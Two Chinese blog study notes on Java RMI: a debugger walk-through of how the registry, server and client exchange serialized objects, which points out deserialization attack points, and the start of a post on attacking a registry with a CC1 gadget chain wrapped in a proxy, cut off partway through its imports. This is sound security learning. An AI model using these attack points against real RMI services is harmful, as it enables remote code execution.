class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> helloService.sayHello(<span class="string">&quot;FLOW&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;服务器响应：&quot;</span> + response);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;客户端异常：&quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>然后就能运行起来了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250303212732.png" ></p>
<p>这里有个特别坑的地方，在server的代码里面，绑定registry之前要设置好服务器ip，不然client连接的时候会报错，本身不是很熟悉这个东西，拷打gpt半天都没结局，最后换了cursor才解决的。。。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="从WireShark观察RMI通信过程"><a href="#从WireShark观察RMI通信过程" class="headerlink" title="从WireShark观察RMI通信过程"></a>从WireShark观察RMI通信过程</h4><p>wireshark开一个本地抓包，粗略看一眼就可以发现有很多RMI协议的包，当然前后的TCP包也要注意</p>
<p>可以看到这里<strong>25-27</strong>号包是在tcp三次握手建立连接的过程</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250304182910.png" ></p>
<p>建立连接之后数据端与注册中心建立通讯，1099是注册端，50140是客户端</p>
<p>建立TCP连接后开始请求调用，看到后面有一个CALL，数据包里面包含了要调用的远程函数名，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-04%2021.33.07.png" ></p>
<p>再往下看到ReturnData，返回了很多代理服务对象，是序列化的数据，可以看到序列化的魔术头，最后还看到一个新的端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-04%2021.35.30.png" ></p>
<p>c3b0 50096，指的是提供服务的端口</p>
<p>后面客户端（50141）新起一个端口和服务端（50096）建立连接，会看到建立了第二次TCP连接，有三个握手包</p>
<p>建立连接后继续发送序列化数据和我们要打印的数据</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-04%2021.41.01.png" ></p>
<p>红色和紫色分别代表客户端和服务端发送的数据，可以清晰地看到数据的来回传送</p>
<p>可以看到整个过程中数据流都是通过序列化传输的，那客户端和服务端必定有序列化反序列化的地方。</p>
<p>看完整个流量包过程再看会前面那张流程图就会清晰很多，推荐所有人都去动手做一下。</p>
<h4 id="从源码观察调用过程"><a href="#从源码观察调用过程" class="headerlink" title="从源码观察调用过程"></a>从源码观察调用过程</h4><h5 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h5><p>创建远程对象然后发布到网上，就已经可以通信了，我们要了解这是个什么样的过程</p>
<p>说是没什么server这个部分其实没什么漏洞，但是要了解一下过程</p>
<h6 id="创建服务并发布"><a href="#创建服务并发布" class="headerlink" title="创建服务并发布"></a>创建服务并发布</h6><p>为了跟着教程，这里我用Drunk师傅的代码调试，不知道为什么自己的idea跳不进去，我这里断点打在<code>RemoteObjectImpl</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250317234238.png" ></p>
<p><code>RemoteObjectImpl</code>是继承<code>UnicastRemoteObject</code>类（继承这个类是硬性要求。另一种写法是在下面的代码块写一段直接调用），所以会先到父类的构造函数，f7步进</p>
<p>跳到下图地方，可以看到给了一个port端口，一开始是0</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250317235155.png" ></p>
<p>再继续往下看，来到 <code>exportObject()</code>，就是这个函数负责把服务发步到网络，跟进去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318000013.png" ></p>
<p>看到还套了一层，里面有一个<code>UnicastServerRef()</code>，这里在idea里直接点击UnicastServerRef，就会跳转到这个函数里面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318000151.png" ></p>
<p>有一个**<code>LiveRef</code>**，这个很重要，继续跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318000949.png" ></p>
<p>是一个构造函数，点this进去看看，构造函数如下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318001016.png" ></p>
<p>第一个参数是ID，第三个参数是true，主要是第二个参数，TCPEndpoint这个名字一听就是和网络请求有关的，构造参数是一个host一个port</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318001235.png" ></p>
<p>LiveRef构造函数点击this进去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-18%2000.16.21.png" ></p>
<p>可以看到进行了赋值，host和port都在endpoint里面了，而这个endpoint在LiveRef里面，注意这些id，会发现整个过程处理的都是一个LiveRef</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-18%2000.17.36.png" ></p>
<p>以上完成了对<code>LiveRef</code>的建立，代码会回到前面</p>
<p>一直走，其中这一步把之前的<code>LiveRef</code>给ref，操作对象一直都是同一个</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318003347.png" ></p>
<p>跳到这里又调用了一个&#96;exportObect，继续跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318003553.png" ></p>
<p>一直跟到这里出现了stub，这个是在整个RMI一个很重要的东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318003646.png" ></p>
<p>在这里先放一张原理图</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250318003830.png" ></p>
<p>RMI在服务端建立的时候，现在服务端新建一个stub，再把stub传给RMI registry，最后让RMI Client去获取stub</p>
<p>这个stub在后面一个createProxy的地方被创建，看名字就知道是创建代理，跟进去看一下</p>
<p>可以看到这里有一个判断，这里不会进入，先不管，后面接触了再理解</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323143451.png" ></p>
<p>然后到了后面就是创建动态代理，看一下里面的参数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323144026.png" ></p>
<p>第一个参数是一个AppClassLoader，第二个是个远程接口，第三个是个调用处理器，可以看到里面包裹的就是我们之前一直操作的Ref，始终处理的对象就是这一个。</p>
<p>创建完动态代理后出来，可以看到stub已经有内容，里面也带上了Ref</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323144307.png" ></p>
<p>再继续往后，看到代码在创建一个Target，我们把taget理解成一个总封装，把我们之前创建的有用的参数包起来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323144440.png" ></p>
<p>看一下构造函数里面怎么操作的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323150155.png" ></p>
<p>看里面的值，一直都是一个LiveRef</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323150329.png" ></p>
<p>一路步过跳出target，看到后面又进入一个exportObject()</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323150601.png" ></p>
<p>一路跟进，到后面发现进入到TCPTransport里面的exportObject()，一进来就看到里面一个listen()函数，这里相当于开始处理真正的网络请求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323150730.png" ></p>
<p>跟到一定的地方会看到里面新建一个socket，等待连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323151003.png" ></p>
<p>后面的thread里就去做完成连接之后的事，如果有连接，就会进入run</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323151430.png" ></p>
<p>后面还有一个地方给port赋值</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323151348.png" ></p>
<p>listen()主要就是开了一个socket，在整个流程里添加了port，这块内容记录在stub里面</p>
<h6 id="发布服务后的记录"><a href="#发布服务后的记录" class="headerlink" title="发布服务后的记录"></a>发布服务后的记录</h6><p>再继续一直跟，出现了两个put，RMI会把所有信息保存在两个table里，相当于一个记录作用吧，这块就不细看了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323152146.png" ></p>
<h6 id="服务端创建小结"><a href="#服务端创建小结" class="headerlink" title="服务端创建小结"></a>服务端创建小结</h6><p>思路还是比较清晰的，主要就是一直利用exportObject()包装对象，一直处理的对象也就是那个LiveRef，进行各种各样的封装赋值。顺便给了端口，开了socket。</p>
<p>完成之后还有一个记录，是保存在静态的HashMap里面的，Drunk师傅说当日志理解就可以了。</p>
<p>服务端自己创建远程服务整个过程不存在漏洞。</p>
<h5 id="创建注册端-绑定"><a href="#创建注册端-绑定" class="headerlink" title="创建注册端+绑定"></a>创建注册端+绑定</h5><p>创建注册端和服务端还有点像，本质上也是把服务发布到网上，这块过的快一点</p>
<h6 id="创建注册中心"><a href="#创建注册中心" class="headerlink" title="创建注册中心"></a>创建注册中心</h6><p>断点打在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323153603.png" ></p>
<p>然后进入到<code>createRegistry()</code>-&gt;<code>RegistryImpl()</code>，这里传入端口号1099</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323153939.png" ></p>
<p>再跟进，中间有些别的代码是些安全检查，我们一直看到136行，这里新建了一个我们很熟悉的LiveRef和一个UnicastServerRef</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323154223.png" ></p>
<p>和之前创建远程服务端流程很像，我们跟进到里面的setup看一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323154428.png" ></p>
<p>里面也是用到exportObject()，对比一下之前创建远程对象的exportObject()</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323154746.png" ></p>
<p>对比一下他们的参数，主要区别就是第三个参数，服务端是false，注册端是true，描述是permanent，很好理解，这代表我们注册端注册的服务是一个永久对象，服务端的服务是一个临时对象</p>
<p>继续跟进，也是来到创建stub的地方，但是这个和之前服务端的创建就不一样，进入到createProxy()</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323155134.png" ></p>
<p>这次这里的判断就比较重要，我们跟进<code>stubClassExists()</code>判断</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323155455.png" ></p>
<p>大概逻辑就是看能不能获取到<code>RegistryImpl_Stub</code>这个类，如果有就返回true，没有就false，我们这个版本的java是有<code>RegistryImpl_Stub</code>这个类的，所以返回true，我们会进入到if语句里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323160835.png" ></p>
<p>所以下一步是进入到<code>createStub()</code>里面，跟进看一下</p>
<p>就是通过反射创建这个对象，里面放的是ref</p>
<blockquote>
<p>相比于之前<strong>发布远程对象</strong>中的 Stub，是一个动态代理，里面放的是一个 ref。<br>现在<strong>发布远程对象</strong>是用 forName 创建的，里面放的也是 ref，是一致的。</p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323161212.png" ></p>
<p>创建完回去再往下，我们会进入到<code>setSkeleton()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323161452.png" ></p>
<p>进去里面有一个<code>createSkeleton()</code>，根据前面的流程图，我们知道skeleton是作为服务端的代理</p>
<p>skeleton是通过forname()的方法创建的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323161809.png" ></p>
<p>再往后，又来到target，作用也很前面服务端一样把数据包裹进去</p>
<p>此时看变量情况，ref里面多了skel对象</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323161957.png" ></p>
<p>迅速跳过，到下面的<code>exportObject()</code>，流程和前面一样，直到一个<code>super.exportObject(target);</code>跟进去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323162210.png" ></p>
<p>有一个<code>ObjectTable.putTarget(target)</code> 又是一次封装</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323162424.png" ></p>
<p>一路赋值完，我们关注一下控制台变量的情况，主要是点开objTable，可以看到有三个target</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323163307.png" ></p>
<p>target@801里面disp和stub里面包的ref是同一个，端口号都是1099，stub是一个RegustryImpl_Stub</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323164614.png" ></p>
<p>target@842里面的stub是$proxy对象的，也可以看到ref详情</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323164752.png" ></p>
<p>再看target@840,里面的stub是一个DGCImpl_Stub，是分布式垃圾回收的一个对象，后面会再接触到</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323164928.png" ></p>
<h6 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h6><p>主要是这个bind()方法，比较简单，标注在图里了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-03-23%2016.57.52.png" ></p>
<h6 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h6><p>注册端创建和服务端创建总体还是差不多的，区别在于一个是持久的一个是临时的，还有stub的判断和创建方式也有些不同。关于为什么最后数据有三个target，且里面stub的类型还不一样，要到后面才能解答。</p>
<h5 id="客户端请求注册中心–客户端"><a href="#客户端请求注册中心–客户端" class="headerlink" title="客户端请求注册中心–客户端"></a>客户端请求注册中心–客户端</h5><p>*这块存在漏洞</p>
<p>三个代码都打断点</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323175236.png" ></p>
<p>进入<code>getRegistry()</code>,会看到很多之前熟悉的操作，赋值LiveRef，createProxy等</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323175616.png" ></p>
<p>和之前一样新建一个ref，可以看到ip端口信息都在里面了，这里就算我们获取了注册中心等stub，后面去查找远程对象</p>
<p>代码第二句进来看到很多log相关的语句，无关紧要，跳了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323184407.png" ></p>
<p>直到这个lookup，这里因为java版本对不上，没办法打断点，直接看逻辑吧</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323184440.png" ></p>
<p>此时看到变量情况，会看到有一个<code>param_1=&quot;remoteObj&quot;</code>，这个是传参的var1，这个参数是作为序列化数据传进去的，注册中心后续会通过反序列化读取。</p>
<p>接着有一个<code>supre.ref.invoke(var2)</code>，查看详情可以知道是<code>UnicastRef</code>类，<code>invoke()</code>方法里面有 <code>call.executeCall()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323184904.png" ></p>
<p>在 <code>call.executeCall()</code>里面处理真正的网络请求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323185112.png" ></p>
<p>进入到<code>call.executeCall()</code>里面有一个<code>readObject()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323185217.png" ></p>
<p>看到in变量，不难理解就是数据流的东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323185259.png" ></p>
<p>这里处理异常本意是好，但是如果注册中心返回的是一个恶意的流，会导致在这个地方反序列化。这个点更隐蔽，影响面更大，因为所有处理网络请求都会经过这个地方</p>
<p>以上就是客户端和注册中心之间的操作，f8回到主函数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250323185913.png" ></p>
<p>可以看到我们已经获取了remoteObj这个动态代理，里面包含了一个ref</p>
<h5 id="客户端请求服务端–客户端"><a href="#客户端请求服务端–客户端" class="headerlink" title="客户端请求服务端–客户端"></a>客户端请求服务端–客户端</h5><p>这里断点打在第三句</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414142810.png" ></p>
<p>因为此时<code>helloService</code>是一个动态代理类，所以一开始会进入到invoke</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414142931.png" ></p>
<p>重点看到最底下的<code>invokeRemoteMethod</code>方法，跟进去，里面有一个<code>ref.invoke()</code>，是一个重载的方法，里面是用来创建一个连接，具体逻辑如下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414143210.png" ></p>
<p>继续走，有一个<code>marshalValue</code>方法，里面会做一堆判断，然后序列化我们调用远程函数时传进去的参数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414143345.png" ></p>
<p>再继续往前，又遇到<code>call.executeCall()</code>，前文也提到了，RMI执行网络请求的时候就会一定会走到这个地方，是存在危险的</p>
<p>后面就是<code>unmarshalValue()</code>，因为我们传入的参数类型是String，不符合前面一系列判断，这里会进行一次反序列化操作，把数据读回来，这里也是一个攻击点</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414143853.png" ></p>
<p>然后一路跟进就走会主函数，代码完成远程函数调用</p>
<h6 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h6><ul>
<li>存在攻击的点，注册中心-&gt;服务端，查找远程对象的时候存在攻击点，具体表现为服务端打客户端，入口类是<code>call.executeCall()</code>，里面再抛出异常的时候存在反序列化点</li>
<li>服务端-&gt;客户端两个攻击点，一个是<code>call.executeCall()</code>，另一个是<code>unmarshalValue()</code></li>
</ul>
<h5 id="注册中心处理客户端请求"><a href="#注册中心处理客户端请求" class="headerlink" title="注册中心处理客户端请求"></a>注册中心处理客户端请求</h5><p>从注册中心角度看客户端请求，主要是处理skel，前面新建注册中心的过程有一个listen()，最后肯定会走到<code>RegistryImpl_Skel</code>里面（具体过程可以回顾白日梦组长的视频）</p>
<p>断点打在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414171358.png" ></p>
<p>RMIServer开启调试模式，RMIClient运行程序，调试会自动跳到这里</p>
<p>看一下此时target里面有一个stub，stub里面的ref指向的是1099端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414212554.png" ></p>
<p>往下走到<code>final Dispatcher disp = target.getDispatcher();</code>，这一步是把<code>skel</code>的值放到disp中</p>
<p>再继续往下有一个<code>disp.dispatch</code>，跟进去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414212846.png" ></p>
<p><code>oldDispatch()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414213102.png" ></p>
<p><code>disp.dispatch</code>()-&gt;<code>oldDispatch()</code>-&gt;<code>skel.dispatch()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414213215.png" ></p>
<p>重点是<code>skel.dispatch</code>，这部分源码主要是case，以下这段<a class="link"   href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80" >引自<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>我们与注册中心进行交互可以使用如下几种方式：</p>
<ul>
<li>list</li>
<li>bind</li>
<li>rebind</li>
<li>unbind</li>
<li>lookup</li>
</ul>
<p>这几种方法位于 <code>RegistryImpl_Skel#dispatch</code> 中，也就是我们现在 dispatch 这个方法的地方。</p>
<p>如果存在对传入的对象调用 <code>readObject</code> 方法，则可以利用，<code>dispatch</code> 里面对应关系如下：</p>
<ul>
<li>0-&gt;bind</li>
<li>1-&gt;list</li>
<li>2-&gt;lookup</li>
<li>3-&gt;rebind</li>
<li>4-&gt;unbind</li>
</ul>
<p>只要中间是有反序列化就是可以攻击的，而且我们是从客户端打到注册中心，这其实是黑客们最喜欢的攻击方式。我们来看一看谁可以攻击。</p>
</blockquote>
<p>比如case 0里面有readObject()</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414213551.png" ></p>
<p>一圈看下来只有list没有</p>
<h6 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h6><p>客户端请求的时候，注册中心主要就是处理target，完成skel的生成和处理</p>
<p>漏洞点主要在dispatch，多数case里面都有readObject()，方便后续利用</p>
<h5 id="服务端处理客户端请求"><a href="#服务端处理客户端请求" class="headerlink" title="服务端处理客户端请求"></a>服务端处理客户端请求</h5><p>继续走一样的流程，但是这次的target里面stub是<code>$proxy0</code>，和注册中心的流程有些区别</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414215400.png" ></p>
<p>来到这里，因为skel是null，所以不会进入<code>oldDispatch()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414221043.png" ></p>
<p>后面可以看到一个method，参数是我们传入的参数sayhello（要调用的远程函数名）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414221420.png" ></p>
<p>继续往下走，重点是<code>unmarshalValue()</code>，这个部分可以理解成对称。前面客户发送请求的时候，把参数用marshalValue序列化，这里用unmarshalValue反序列化出来，还有其他地方有这样的对应。</p>
<h5 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h5><p>前面创建注册中心的时候有一个<code>DGCImpl_Stub</code>,现在看一下是什么机制</p>
<p>断点打在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414222105.png" ></p>
<p>前面说会把taget放到一个静态表里，相当于日志记录作用，在put之前，我们可以看到变量里面就有这个DGC，而且还存放在static里面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414222730.png" ></p>
<p>现在来看DGC是怎么创建的，主要就是这两句，看似没什么操作</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414222105.png" ></p>
<p>但是这里用了静态变量 <strong>调用静态变量会触发类的初始化</strong></p>
<p>看到DGCImpl里面有一个static方法，作用是 class initializer，断点打在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414223156.png" ></p>
<p>后面又有createProxy()，进去里面有一个createstub</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414223318.png" ></p>
<p>这里像注册中心创建远程服务一样，看是否可以获得这个类<code>DGCImpl_Stub</code>，是有的</p>
<p>整个过程就像注册中心创建远程服务，但是目的不一样，这里创建的是用于回收机制的，并且端口随机</p>
<p>DGC有漏洞的地方：看到这个类<code>DGCImpl_Stub</code>本身，里面有clean和dirty方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414224049.png" ></p>
<p><code>DGCImpl_Skel</code>也有</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250414224229.png" ></p>
<ul>
<li>DGC是自动创建的一个过程，用于清理内存。客户端和服务端都有攻击点，而且这是自动生成的，只要创建了远程对象就会有DGC服务</li>
</ul>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>【Java反序列化RMI专题-没有人比我更懂RMI】<a class="link"   href="https://www.bilibili.com/video/BV1L3411a7ax?p=10&vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1L3411a7ax?p=10&amp;vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/" >https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>这篇拖了好久好久好久，博客也没有保持更新频率，真是太拖拉了，战线拉太长现在结束了没有心情注意格式和内容正确了，后面有空再修一下吧。学这部分内容相对比较枯燥，总体还是好理解了，算是自己的java基础多添加了一块砖。希望后面赶上进度。</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-RMI几种攻击</title>
    <url>/2025/04/15/Java-RMI%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>全文参考</p>
<p> <a class="link"   href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F" >https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F<i class="fas fa-external-link-alt"></i></a></p>
<p>做一些简单复现，在心里过一遍这个概念</p>
<h4 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h4><p>之前看代码的时候知道<code>RegistryImpl_Skel#dispatch</code>里面有几个方式，对应关系如下</p>
<ul>
<li>0 —– bind</li>
<li>1 —– list</li>
<li>2 —– lookup</li>
<li>3 —– rebind</li>
<li>4 —– unbind</li>
</ul>
<p>分别看下面几个方式</p>
<h5 id="利用list-攻击"><a href="#利用list-攻击" class="headerlink" title="利用list()攻击"></a>利用list()攻击</h5><p>几个case只有list里面没有readObject，所以没什么攻击面，这里只能简单打印出信息</p>
<p>在RMIClient新建代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 针对 Registry 的 list 鸡肋攻击  </span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">// 针对 Registry 的 list 鸡肋攻击  </span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String[] s = Naming.list(&quot;rmi://127.0.0.1:1099&quot;);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250415211651.png" ></p>
<h5 id="bind-或rebind"><a href="#bind-或rebind" class="headerlink" title="bind()或rebind()"></a>bind()或rebind()</h5><p>看一下源码，可以看到case0也就是bind里面有readObject</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250415212100.png" ></p>
<p>case2的rebind也是（不截图了）</p>
<p>这两个地方都存在反序列化点，参数是我们的参数名和远程对象</p>
<p>现在尝试用CC1，CC1最后面是 <code>InvocationHandler.readObject()</code>，现在我们要让客户端的 <code>bind()</code> 方法执行 <code>readObject()</code>。</p>
<blockquote>
<p> RMI注册中心（<code>Registry</code>）的 <code>bind()</code> 方法要求绑定的对象必须是 <strong><code>Remote</code> 接口的实现类或其代理对象</strong>。直接传入普通对象（如 <code>InvocationHandler</code>）会因类型不匹配被拒绝</p>
</blockquote>
<p>这里客户端收到信息是一个proxy对象，让proxy对象被执行的时候去调用readObject，所以我们有一个CC1生成的对象后要给他要一个动态代理的壳，以下是代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span 